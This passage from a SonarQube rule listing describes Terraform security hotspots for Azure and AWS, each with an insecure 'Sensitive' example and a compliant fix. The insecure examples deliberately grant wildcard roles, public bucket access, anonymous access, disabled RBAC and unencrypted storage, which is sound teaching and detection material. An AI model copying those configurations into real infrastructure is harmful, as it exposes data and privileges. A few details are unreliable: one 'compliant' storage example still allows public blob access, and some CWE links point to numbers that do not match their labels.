this, cloud infrastructure is often used by attackers as a gateway to other assets. Attackers can leverage this gateway to gain access to more
services, to compromise more business-critical data, and to cause more damage to the overall infrastructure.</p>
<h4>Compromise of sensitive data</h4>
<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers with the correct role
could be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity theft, financial loss, or
other negative outcomes.</p>
<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>
<h4>Financial loss</h4>
<p>Financial losses can occur when a malicious user is able to use a paid third-party-provided service. Each users assigned with a bad role will be
able to use it without limit to use the third party service to their own need, including in a way that was not expected.</p>
<p>This additional use will lead to added costs with the Azure service provider.</p>
<p>Moreover, when rate or volume limiting is set up on the provider side, this additional use can prevent the regular operation of the affected
environment. This might result in a partial denial of service for all legitimate users.</p>
<h2>How to fix it</h2>
<p>To reduce the risk of intrusion of a compromised owner, it is recommended to limit the number of subscription owners.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
resource "azurerm_role_definition" "example" { # Sensitive
  name        = "example"
  scope       = data.azurerm_subscription.primary.id

  permissions {
    actions     = ["*"]
    not_actions = []
  }

  assignable_scopes = [
    data.azurerm_subscription.primary.id
  ]
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
resource "azurerm_role_definition" "example" {
  name        = "example"
  scope       = data.azurerm_subscription.primary.id

  permissions {
    actions     = ["Microsoft.Compute/*"]
    not_actions = []
  }

  assignable_scopes = [
    data.azurerm_subscription.primary.id
  ]
}
</pre>
<h3>Going the extra mile</h3>
<p>Here is a list of recommendations that can be followed regarding good usage of roles:</p>
<ul>
  <li> Apply the least privilege principle by creating a custom role with as few permissions as possible. </li>
  <li> As custom roles can be updated, gradually add atomic permissions when required. </li>
  <li> Limit the assignable scopes of the custom role to a set of Resources or Resource Groups. </li>
  <li> When necessary, use the built-in Owner role instead of a custom role granting subscription owner capabilities. </li>
  <li> Limit the assignments of Owner roles to less than three people or service principals. </li>
</ul>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Azure Documentation - <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/custom-roles">Azure custom roles</a> </li>
  <li> Azure Documentation - <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/best-practices">Best practices for Azure
  RBAC</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/266">CWE-266 - Incorrect Privilege Assignment</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6387">
              terraform:S6387
            </a>
          </td>
          <td>
            <details>
              <p>Azure RBAC roles can be assigned to users, groups, or service principals. A role assignment grants permissions on a predefined set of resources
called "scope".</p>
<p>The widest scopes a role can be assigned to are:</p>
<ul>
  <li> Subscription: a role assigned with this scope grants access to all resources of this Subscription. </li>
  <li> Management Group: a scope assigned with this scope grants access to all resources of all the Subscriptions in this Management Group. </li>
</ul>
<p>In case of security incidents involving a compromised identity (user, group, or service principal), limiting its role assignment to the narrowest
scope possible helps separate duties and limits what resources are at risk.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The user, group, or service principal doesn’t use the entirety of the resources in the scope to operate on a day-to-day basis. </li>
  <li> It is possible to follow the Separation of Duties principle and split the scope into multiple role assignments with a narrower scope. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Limit the scope of the role assignment to a Resource or Resource Group. </li>
  <li> Apply the least privilege principle by assigning roles granting as few permissions as possible. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
resource "azurerm_role_assignment" "example" {
  scope                = data.azurerm_subscription.primary.id # Sensitive
  role_definition_name = "Reader"
  principal_id         = data.azuread_user.user.object_id
}
</pre>
<h2>Compliant Solution</h2>
<pre>
resource "azurerm_role_assignment" "example" {
  scope                = azurerm_resource_group.example.id
  role_definition_name = "Reader"
  principal_id         = data.azuread_user.user.object_id
}
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/266">CWE-266 - Incorrect Privilege Assignment</a> </li>
  <li> <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/scope-overview">Azure Documentation</a> - Understand scope for Azure
  RBAC </li>
  <li> <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/best-practices">Azure Documentation</a> - Best practices for Azure
  RBAC </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6265">
              terraform:S6265
            </a>
          </td>
          <td>
            <details>
              <p>Predefined permissions, also known as <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl">canned ACLs</a>,
are an easy way to grant large privileges to predefined groups or users.</p>
<p>The following canned ACLs are security-sensitive:</p>
<ul>
  <li> <code>PublicRead</code>, <code>PublicReadWrite</code> grant respectively "read" and "read and write" privileges to everyone in the world
  (<code>AllUsers</code> group). </li>
  <li> <code>AuthenticatedRead</code> grants "read" privilege to all authenticated users (<code>AuthenticatedUsers</code> group). </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The S3 bucket stores sensitive data. </li>
  <li> The S3 bucket is not used to store static resources of websites (images, css …​). </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to implement the least privilege policy, ie to grant necessary permissions only to users for their required tasks. In the context
of canned ACL, set it to <code>private</code> (the default one) and if needed more granularity then use an appropriate S3 policy.</p>
<h2>Sensitive Code Example</h2>
<p>All users (ie: anyone in the world authenticated or not) have read and write permissions with the <code>public-read-write</code> access
control:</p>
<pre>
resource "aws_s3_bucket" "mynoncompliantbucket" { # Sensitive
  bucket = "mynoncompliantbucketname"
  acl    = "public-read-write"
}
</pre>
<h2>Compliant Solution</h2>
<p>With the <code>private</code> access control (default), only the bucket owner has the read/write permissions on the buckets and its ACL.</p>
<pre>
resource "aws_s3_bucket" "mycompliantbucket" { # Compliant
  bucket = "mycompliantbucketname"
  acl    = "private"
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl">AWS Documentation</a> - Access control list (ACL)
  overview (canned ACLs) </li>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/walkthrough1.html">AWS Documentation</a> - Controlling access to a bucket with
  user policies </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6381">
              terraform:S6381
            </a>
          </td>
          <td>
            <details>
              <p>Azure Resource Manager offers built-in roles that can be assigned to users, groups, or service principals. Some of these roles should be carefully
assigned as they grant sensitive permissions like the ability to reset passwords for all users.</p>
<p>An Azure account that fails to limit the use of such roles has a higher risk of being breached by a compromised owner.</p>
<p>This rule raises an issue when one of the following roles is assigned:</p>
<ul>
  <li> Contributor (b24988ac-6180-42a0-ab88-20f7382dd24c) </li>
  <li> Owner (8e3af657-a8ff-443c-a75c-2fe8c4bcb635) </li>
  <li> User Access Administrator (18d7d88d-d35e-4fb5-a5c3-7773c20a72d9) </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The user, group, or service principal doesn’t use the entirety of this extensive set of permissions to operate on a day-to-day basis. </li>
  <li> It is possible to follow the Separation of Duties principle and split permissions between multiple users, but it’s not enforced. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Limit the assignment of Owner roles to less than 3 people or service principals. </li>
  <li> Apply the least privilege principle by choosing a role with a limited set of permissions. </li>
  <li> If no built-in role meets your needs, create a custom role with as few permissions as possible. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
resource "azurerm_role_assignment" "example" {
  scope                = azurerm_resource_group.example.id
  role_definition_name = "Owner" # Sensitive
  principal_id         = data.azuread_user.example.id
}
</pre>
<h2>Compliant Solution</h2>
<pre>
resource "azurerm_role_assignment" "example" {
  scope                = azurerm_resource_group.example.id
  role_definition_name = "Azure Maps Data Reader"
  principal_id         = data.azuread_user.example.id
}
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-266 - Incorrect Privilege Assignment</a> </li>
  <li> <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/built-in-roles">Azure Documentation</a> - Azure built-in roles </li>
  <li> <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/best-practices">Azure Documentation</a> - Best practices for Azure
  RBAC </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6380">
              terraform:S6380
            </a>
          </td>
          <td>
            <details>
              <p>Allowing anonymous access can reduce an organization’s ability to protect itself against attacks on its Azure resources.</p>
<p>Security incidents may include disrupting critical functions, data theft, and additional Azure subscription costs due to resource overload.</p>
<p>Using authentication coupled with fine-grained authorizations helps bring defense-in-depth and bring traceability to investigators of security
incidents.</p>
<p>Depending on the affected Azure resource, multiple authentication choices are possible: Active Directory Authentication, OpenID implementations
(Google, Microsoft, etc.) or native Azure mechanisms.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> This Azure resource is essential for the information system infrastructure. </li>
  <li> This Azure resource is essential for mission-critical functions. </li>
  <li> This Azure resource stores or processes sensitive data. </li>
  <li> Compliance policies require access to this resource to be authenticated. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable authentication in this Azure resource, and disable anonymous access.</p>
<p>If only Basic Authentication is available, enable it.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://azure.microsoft.com/en-us/services/app-service/">App Services and equivalent</a>:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
resource "azurerm_function_app" "example" {
  name = "example"

  auth_settings {
    enabled = false # Sensitive
  }

  auth_settings {
    enabled = true
    unauthenticated_client_action = "AllowAnonymous" # Sensitive
  }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/api-management/">API Management</a>:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
resource "azurerm_api_management_api" "example" { # Sensitive, the openid_authentication block is missing
  name = "example-api"
}

resource "azurerm_api_management" "example" {
  sign_in {
    enabled = false # Sensitive
  }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/data-factory/">Data Factory</a> Linked Services:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
resource "azurerm_data_factory_linked_service_sftp" "example" {
  authentication_type = "Anonymous"
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/product-categories/storage/">Storage Accounts</a>:</p>
<pre data-diff-id="4" data-diff-type="noncompliant">
resource "azurerm_storage_account" "example" {
  allow_blob_public_access = true # Sensitive
}

resource "azurerm_storage_container" "example" {
  container_access_type = "blob" # Sensitive
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/cache/">Redis Caches</a>:</p>
<pre data-diff-id="5" data-diff-type="noncompliant">
resource "azurerm_redis_cache" "example" {
  name = "example-cache"

  redis_configuration {
    enable_authentication = false # Sensitive
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://azure.microsoft.com/en-us/services/app-service/">App Services and equivalent</a>:</p>
<pre data-diff-id="1" data-diff-type="compliant">
resource "azurerm_function_app" "example" {
  name = "example"

  auth_settings {
    enabled = true
    unauthenticated_client_action = "RedirectToLoginPage"
  }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/api-management/">API Management</a>:</p>
<pre data-diff-id="2" data-diff-type="compliant">
resource "azurerm_api_management_api" "example" {
  name = "example-api"

  openid_authentication {
    openid_provider_name = azurerm_api_management_openid_connect_provider.example.name
  }
}

resource "azurerm_api_management" "example" {
  sign_in {
    enabled = true
  }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/data-factory/">Data Factory</a> Linked Services:</p>
<pre data-diff-id="3" data-diff-type="compliant">
resource "azurerm_data_factory_linked_service_sftp" "example" {
  authentication_type = "Basic"
  username            = local.creds.username
  password            = local.creds.password
}

resource "azurerm_data_factory_linked_service_odata" "example" {
  basic_authentication {
    username = local.creds.username
    password = local.creds.password
  }
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/product-categories/storage/">Storage Accounts</a>:</p>
<pre data-diff-id="4" data-diff-type="compliant">
resource "azurerm_storage_account" "example" {
  allow_blob_public_access = true
}

resource "azurerm_storage_container" "example" {
  container_access_type = "private"
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/cache/">Redis Caches</a>:</p>
<pre data-diff-id="5" data-diff-type="compliant">
resource "azurerm_redis_cache" "example" {
  name = "example-cache"

  redis_configuration {
    enable_authentication = true
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/668">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6383">
              terraform:S6383
            </a>
          </td>
          <td>
            <details>
              <p>Disabling Role-Based Access Control (RBAC) on Azure resources can reduce an organization’s ability to protect itself against access controls being
compromised.</p>
<p>To be considered safe, access controls must follow the principle of least privilege and correctly segregate duties amongst users. RBAC helps
enforce these practices by adapting the organization’s access control needs into explicit role-based policies: It helps keeping access controls
maintainable and sustainable.</p>
<p>Furthermore, RBAC allows operations teams to work faster during a security incident. It helps to mitigate account theft or intrusions by quickly
shutting down accesses.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> This Azure resource is essential for the information system infrastructure. </li>
  <li> This Azure resource is essential for mission-critical functions. </li>
  <li> Compliance policies require access to this resource to be enforced through the use of Role-Based Access Control. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Enable Azure RBAC when the Azure resource supports it. </li>
  <li> For Kubernetes clusters, enable Azure RBAC if Azure AD integration is supported. Otherwise, use the built-in Kubernetes RBAC. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://azure.microsoft.com/fr-fr/services/kubernetes-service/">Azure Kubernetes Services</a>:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
resource "azurerm_kubernetes_cluster" "example" {
  role_based_access_control {
    enabled = false # Sensitive
  }
}

resource "azurerm_kubernetes_cluster" "example2" {
  role_based_access_control {
    enabled = true

    azure_active_directory {
      managed = true
      azure_rbac_enabled = false # Sensitive
    }
  }
}
</pre>
<p>For <a href="https://azure.microsoft.com/fr-fr/services/key-vault/">Key Vaults</a>:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
resource "azurerm_key_vault" "example" {
  enable_rbac_authorization = false # Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://azure.microsoft.com/fr-fr/services/kubernetes-service/">Azure Kubernetes Services</a>:</p>
<pre data-diff-id="1" data-diff-type="compliant">
resource "azurerm_kubernetes_cluster" "example" {
  role_based_access_control {
    enabled = true
  }
}

resource "azurerm_kubernetes_cluster" "example" {
  role_based_access_control {
    enabled = true

    azure_active_directory {
      managed = true
      azure_rbac_enabled = true
    }
  }
}
</pre>
<p>For <a href="https://azure.microsoft.com/fr-fr/services/key-vault/">Key Vaults</a>:</p>
<pre data-diff-id="2" data-diff-type="compliant">
resource "azurerm_key_vault" "example" {
  enable_rbac_authorization   = true
}
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/668">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6382">
              terraform:S6382
            </a>
          </td>
          <td>
            <details>
              <p>Disabling certificate-based authentication can reduce an organization’s ability to react against attacks on its critical functions and data.</p>
<p>Azure offers various authentication options to access resources: Anonymous connections, Basic authentication, password-based authentication, and
certificate-based authentication.</p>
<p>Choosing certificate-based authentication helps bring client/host trust by allowing the host to verify the client and vice versa. It cannot be
forged or forwarded by a man-in-the-middle eavesdropper, and the certificate’s private key is never sent over the network so it’s harder to steal than
a password.</p>
<p>In case of a security incident, certificates help bring investigators traceability and allow security operations teams to react faster. For
example, all compromised certificates could be revoked individually, or an issuing certificate could be revoked which causes all the certificates it
issued to become untrusted.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> This Azure resource is essential for the information system infrastructure. </li>
  <li> This Azure resource is essential for mission-critical functions. </li>
  <li> Compliance policies require access to this resource to be authenticated with certificates. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable certificate-based authentication.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://azure.microsoft.com/en-us/services/app-service/">App Service</a>:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
resource "azurerm_app_service" "example" {
  client_cert_enabled = false # Sensitive
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/logic-apps/">Logic App Standards</a> and <a
href="https://azure.microsoft.com/en-us/services/functions/">Function Apps</a>:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
resource "azurerm_function_app" "example" {
  client_cert_mode = "Optional" # Sensitive
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/data-factory/">Data Factory Linked Services</a>:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
resource "azurerm_data_factory_linked_service_web" "example" {
  authentication_type = "Basic" # Sensitive
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/api-management/">API Management</a>:</p>
<pre data-diff-id="4" data-diff-type="noncompliant">
resource "azurerm_api_management" "example" {
  sku_name = "Consumption_1"
  client_certificate_mode = "Optional" # Sensitive
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/app-service/containers/">Linux and Windows Web Apps</a>:</p>
<pre data-diff-id="5" data-diff-type="noncompliant">
resource "azurerm_linux_web_app" "example" {
  client_cert_enabled = false # Sensitive
}
resource "azurerm_linux_web_app" "exemple2" {
  client_cert_enabled = true
  client_cert_mode = "Optional" # Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://azure.microsoft.com/en-us/services/app-service/">App Service</a>:</p>
<pre data-diff-id="1" data-diff-type="compliant">
resource "azurerm_app_service" "example" {
  client_cert_enabled = true
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/logic-apps/">Logic App Standards</a> and <a
href="https://azure.microsoft.com/en-us/services/functions/">Function Apps</a>:</p>
<pre data-diff-id="2" data-diff-type="compliant">
resource "azurerm_function_app" "example" {
  client_cert_mode = "Required"
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/data-factory/">Data Factory Linked Services</a>:</p>
<pre data-diff-id="3" data-diff-type="compliant">
resource "azurerm_data_factory_linked_service_web" "example" {
  authentication_type = "ClientCertificate"
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/api-management/">API Management</a>:</p>
<pre data-diff-id="4" data-diff-type="compliant">
resource "azurerm_api_management" "example" {
  sku_name = "Consumption_1"
  client_certificate_mode = "Required"
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/app-service/containers/">Linux and Windows Web Apps</a>:</p>
<pre data-diff-id="5" data-diff-type="compliant">
resource "azurerm_linux_web_app" "exemple" {
  client_cert_enabled = true
  client_cert_mode = "Required"
}
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/668">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6317">
              terraform:S6317
            </a>
          </td>
          <td>
            <details>
              <p>Within IAM, identity-based policies grant permissions to users, groups, or roles, and enable specific actions to be performed on designated
resources. When an identity policy inadvertently grants more privileges than intended, certain users or roles might be able to perform more actions
than expected. This can lead to potential security risks, as it enables malicious users to escalate their privileges from a lower level to a higher
level of access.</p>
<h2>Why is this an issue?</h2>
<p>AWS Identity and Access Management (IAM) is the service that defines access to AWS resources. One of the core components of IAM is the policy
which, when attached to an identity or a resource, defines its permissions. Policies granting permission to an identity (a user, a group or a role)
are called identity-based policies. They add the ability to an identity to perform a predefined set of actions on a list of resources.</p>
<p>For such policies, it is easy to define very broad permissions (by using wildcard <code>"*"</code> permissions for example.) This is especially
true if it is not yet clear which permissions will be required for a specific workload or use case. However, it is important to limit the amount of
permissions that are granted and the amount of resources to which these permissions are granted. Doing so ensures that there are no users or roles
that have more permissions than they need.</p>
<p>If this is not done, it can potentially carry security risks in the case that an attacker gets access to one of these identities.</p>
<h3>What is the potential impact?</h3>
<p>AWS IAM policies that contain overly broad permissions can lead to privilege escalation by granting users more access than necessary. They may be
able to perform actions beyond their intended scope.</p>
<h4>Privilege escalation</h4>
<p>When IAM policies are too permissive, they grant users more privileges than necessary, allowing them to perform actions that they should not be
able to. This can be exploited by attackers to gain unauthorized access to sensitive resources and perform malicious activities.</p>
<p>For example, if an IAM policy grants a user unrestricted access to all S3 buckets in an AWS account, the user can potentially read, write, and
delete any object within those buckets. If an attacker gains access to this user’s credentials, they can exploit this overly permissive policy to
exfiltrate sensitive data, modify or delete critical files, or even launch further attacks within the AWS environment. This can have severe
consequences, such as data breaches, service disruptions, or unauthorized access to other resources within the AWS account.</p>
<h2>How to fix it in AWS Identity and Access Management</h2>
<h3>Code examples</h3>
<p>In this example, the IAM policy allows an attacker to update the code of any Lambda function. An attacker can achieve privilege escalation by
altering the code of a Lambda that executes with high privileges.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
resource "aws_iam_policy" "example" {
  name = "example"
  policy =&lt;&lt;EOF
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "lambda:UpdateFunctionCode"
            ],
            "Resource": "*"
        }
    ]
}
EOF
}
</pre>
<h4>Compliant solution</h4>
<p>The policy is narrowed such that only updates to the code of certain Lambda functions (without high privileges) are allowed.</p>
<pre data-diff-id="1" data-diff-type="compliant">
resource "aws_iam_policy" "example" {
  name = "example"
  policy =&lt;&lt;EOF
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "lambda:UpdateFunctionCode"
            ],
            "Resource": "arn:aws:lambda:us-east-2:123456789012:function:my-function:1"
        }
    ]
}
EOF
}
</pre>
<h3>How does this work?</h3>
<h4>Principle of least privilege</h4>
<p>When creating IAM policies, it is important to adhere to the principle of least privilege. This means that any user or role should only be granted
enough permissions to perform the tasks that they are supposed to, and <em>nothing else</em>.</p>
<p>To successfully implement this, it is easier to start from nothing and gradually build up all the needed permissions. When starting from a policy
with overly broad permissions which is made stricter at a later time, it can be harder to ensure that there are no gaps that might be forgotten about.
In this case, it might be useful to monitor the users or roles to verify which permissions are used.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> AWS Documentation - <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html#grant-least-priv">Policies and permissions
  in IAM: Grant least privilege</a> </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> Rhino Security Labs - <a href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/">AWS IAM Privilege Escalation -
  Methods and Mitigation</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-269 - Improper Privilege Management</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6319">
              terraform:S6319
            </a>
          </td>
          <td>
            <details>
              <p>Amazon SageMaker is a managed machine learning service in a hosted production-ready environment. To train machine learning models, SageMaker
instances can process potentially sensitive data, such as personal information that should not be stored unencrypted. In the event that adversaries
physically access the storage media, they cannot decrypt encrypted data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The instance contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SageMaker notebook instances that contain sensitive information. Encryption and decryption are handled transparently by
SageMaker, so no further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a
href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sagemaker_notebook_instance">aws_sagemaker_notebook_instance</a>:</p>
<pre>
resource "aws_sagemaker_notebook_instance" "notebook" {  # Sensitive, encryption disabled by default
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a
href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sagemaker_notebook_instance">aws_sagemaker_notebook_instance</a>:</p>
<pre>
resource "aws_sagemaker_notebook_instance" "notebook" {
  kms_key_id = aws_kms_key.enc_key.key_id
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/sagemaker/latest/dg/encryption-at-rest.html">Protect Data at Rest Using Encryption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6275">
              terraform:S6275
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Elastic Block Store (EBS) is a block-storage service for Amazon Elastic Compute Cloud (EC2). EBS volumes can be encrypted, ensuring the
security of both data-at-rest and data-in-transit between an instance and its attached EBS storage. In the case that adversaries gain physical access
to the storage medium they are not able to access the data. Encryption can be enabled for specific volumes or for <a
href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html#encryption-by-default">all new volumes and snapshots</a>. Volumes created
from snapshots inherit their encryption configuration. A volume created from an encrypted snapshot will also be encrypted by default.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The disk contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt EBS volumes that contain sensitive information. Encryption and decryption are handled transparently by EC2, so no
further modifications to the application are necessary. Instead of enabling encryption for every volume, it is also possible to enable encryption
globally for a specific region. While creating volumes from encrypted snapshots will result in them being encrypted, explicitly enabling this security
parameter will prevent any future unexpected security downgrade.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume">aws_ebs_volume</a>:</p>
<pre>
resource "aws_ebs_volume" "ebs_volume" {  # Sensitive as encryption is disabled by default
}
</pre>
<pre>
resource "aws_ebs_volume" "ebs_volume" {
  encrypted = false  # Sensitive
}
</pre>
<p>For <a
href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_encryption_by_default">aws_ebs_encryption_by_default</a>:</p>
<pre>
resource "aws_ebs_encryption_by_default" "default_encryption" {
  enabled = false  # Sensitive
}
</pre>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration">aws_launch_configuration</a>:</p>
<pre>
resource "aws_launch_configuration" "launch_configuration" {
  root_block_device {  # Sensitive as encryption is disabled by default
  }
  ebs_block_device {  # Sensitive as encryption is disabled by default
  }
}
</pre>
<pre>
resource "aws_launch_configuration" "launch_configuration" {
  root_block_device {
    encrypted = false  # Sensitive
  }
  ebs_block_device {
    encrypted = false  # Sensitive
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume">aws_ebs_volume</a>:</p>
<pre>
resource "aws_ebs_volume" "ebs_volume" {
  encrypted = true
}
</pre>
<p>For <a
href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_encryption_by_default">aws_ebs_encryption_by_default</a>:</p>
<pre>
resource "aws_ebs_encryption_by_default" "default_encryption" {
  enabled = true  # Optional, default is "true"
}
</pre>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration">aws_launch_configuration</a>:</p>
<pre>
resource "aws_launch_configuration" "launch_configuration" {
  root_block_device {
    encrypted = true
  }
  ebs_block_device {
    encrypted = true
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html">Amazon EBS encryption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6270">
              terraform:S6270
            </a>
          </td>
          <td>
            <details>
              <p>Resource-based policies granting access to all users can lead to information leakage.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The AWS resource stores or processes sensitive data. </li>
  <li> The AWS resource is designed to be private. </li>
</ul>
